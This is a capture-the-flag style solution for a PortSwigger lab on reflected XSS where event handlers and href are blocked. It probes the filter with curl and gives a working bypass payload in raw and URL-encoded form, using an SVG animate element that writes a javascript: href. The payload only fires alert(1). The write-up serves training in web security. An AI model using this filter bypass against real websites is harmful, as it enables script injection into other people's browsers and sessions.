# SOLUTION — Reflected XSS with event handlers and href attributes blocked

Reproducible steps, commands and proof. No temporary instance values.

## 1. Identify the lab

```bash
curl -sS "https://<LAB-ID>.web-security-academy.net/" | grep -o '<title>[^<]*</title>'
# <title>Reflected XSS with event handlers and href attributes blocked</title>
```

The status widget starts as `widgetcontainer-lab-status is-notsolved`.

## 2. Confirm the reflection

```bash
curl -sS -g "https://<LAB-ID>.web-security-academy.net/?search=zzqq"
```

```html
<h1>0 search results for 'zzqq'</h1>
```

The term is placed inside the `<h1>` text node, inside single quotes, and is
**not** HTML-escaped — so injected markup is parsed.

## 3. Measure the filter

Each rejected term answers HTTP 400 with a plain-text reason:

| Payload | HTTP | Body |
|---|:--:|---|
| `<b>x</b>` | 400 | `"Tag is not allowed"` |
| `<script>alert(1)</script>` | 400 | `"Tag is not allowed"` |
| `<svg onload=alert(1)>` | 400 | `"Event is not allowed"` |
| `<a href=javascript:alert(1)>x</a>` | 400 | `"Attribute is not allowed"` |
| `<svg>` | 200 | reflected |
| `<a>` | 200 | reflected |
| `<animate>` | 200 | reflected |
| `<text>` | 200 | reflected |

So the filter is a tag/attribute whitelist, not a sanitizer: `on*` handlers and
`href` are rejected, but SVG animation elements are allowed.

## 4. Exploit

```
/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

URL-encoded, the same request is:

```
/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert%281%29+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E
```

Why it works:

* the filter inspects the **request**, so it never sees `href=` — `<animate>`
  writes that attribute into the DOM at render time via `attributeName=href`;
* `values=javascript:alert(1)` is an ordinary attribute value to the filter;
* the `<text>` node is the clickable target, and it carries the word "Click"
  that the simulated user requires;
* the `<'` / `'>` in the surrounding `<h1>` are harmless — the browser builds
  `<svg><a><animate/><text>Click me</text></a></svg>` inside the heading.

## 5. Verify

Server-side oracle: `GET /` after the exploit request shows

```html
<div class='widgetcontainer-lab-status is-solved'><span>LAB</span><p>Solved</p>…
```

Browser oracle (Chrome, trusted click on the `<text>` node):
`window.alert` fires with `1`.

## 6. One command

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
```

The launcher matches the folder name exactly and runs the lab solver in its own
uv environment.
